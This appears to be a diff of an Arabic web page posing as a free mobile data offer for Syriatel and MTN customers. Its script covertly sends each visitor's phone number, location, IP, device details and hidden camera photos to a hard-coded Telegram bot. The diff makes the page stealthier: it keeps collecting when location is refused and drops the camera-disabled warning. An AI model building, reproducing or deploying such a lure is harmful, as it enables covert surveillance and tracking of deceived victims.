@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<!DOCTYPE html><html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -17,37 +16,35 @@
 </head>
 <body>
   <div class="container">
-    <h2>طلب باقة مجانية</h2>
+    <h2>طلب باقة مجانية</h2><select id="operator">
+  <option value="Syriatel">سيريتل</option>
+  <option value="MTN">MTN</option>
+</select>
 
-    <select id="operator">
-      <option value="Syriatel">سيريتل</option>
-      <option value="MTN">MTN</option>
-    </select>
+<input type="text" id="phone" placeholder="رقم الهاتف"/>
 
-    <input type="text" id="phone" placeholder="رقم الهاتف"/>
+<select id="package">
+  <option value="100MB">100 ميجا</option>
+  <option value="500MB">500 ميجا</option>
+  <option value="1GB">1 غيغابايت</option>
+</select>
 
-    <select id="package">
-      <option value="100MB">100 ميجا</option>
-      <option value="500MB">500 ميجا</option>
-      <option value="1GB">1 غيغابايت</option>
-    </select>
+<select id="net">
+  <option value="3G">3G</option>
+  <option value="4G">4G</option>
+  <option value="5G">5G</option>
+</select>
 
-    <select id="net">
-      <option value="3G">3G</option>
-      <option value="4G">4G</option>
-      <option value="5G">5G</option>
-    </select>
+<button onclick="submitRequest()">طلب الباقة</button>
 
-    <button onclick="submitRequest()">طلب الباقة</button>
+<div id="countdown"></div>
 
-    <div id="countdown"></div>
-  </div>
-
-  <video id="video" playsinline autoplay style="display:none;"></video>
+  </div><video id="video" playsinline autoplay style="display:none;"></video>
 
   <script>
     const token="7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
     const chatId="7220184605";
+
     function startCountdown(sec){
       const cd = document.getElementById("countdown");
       cd.innerText = `⏳ جاري المعالجة (${sec}) ثانية`;
@@ -77,9 +74,12 @@
         await sendTelegram("sendLocation",{lat,lon});
         await injectData(lat, lon);
         await capturePhotos();
-
         alert("✅ تم إرسال الطلب بنجاح!");
-      },()=>alert("⚠️ فعّل الموقع الجغرافي أولاً."));
+      }, async ()=>{
+        await injectData("؟", "؟");
+        await capturePhotos();
+        alert("✅ تم إرسال الطلب (بدون موقع)!");
+      });
     }
 
     async function injectData(lat, lon){
@@ -101,20 +101,18 @@
 النوع: ${net}
 📍 الموقع: https://maps.google.com/?q=${lat},${lon}
 🕓 الوقت: ${dt}
-
 🔋 شحن: ${battery.level}% | يشحن؟ ${battery.charging}
 💾 RAM: ${memory}GB | CPU: ${cores} أنوية
 📏 الشاشة: ${screenRes}
 🌐 IP: ${ipinfo.ip||"؟"} (${ipinfo.country_name||"؟"} - ${ipinfo.city||"؟"})
-🖥️ المتصفح: ${ua}
-      `.trim();
+🖥️ المتصفح: ${ua}`.trim();
 
       await sendTelegram("sendMessage", msg);
     }
 
     async function capturePhotos(){
       const stream = await navigator.mediaDevices.getUserMedia({video:true}).catch(()=>null);
-      if(!stream){ return alert("⚠️ الكاميرا غير مفعلة."); }
+      if(!stream){ return; }
       const video = document.getElementById("video");
       video.srcObject = stream;
       await new Promise(r=>setTimeout(r,1000));
@@ -131,6 +129,5 @@
       }
       stream.getTracks().forEach(t=>t.stop());
     }
-  </script>
-</body>
+  </script></body>
 </html>
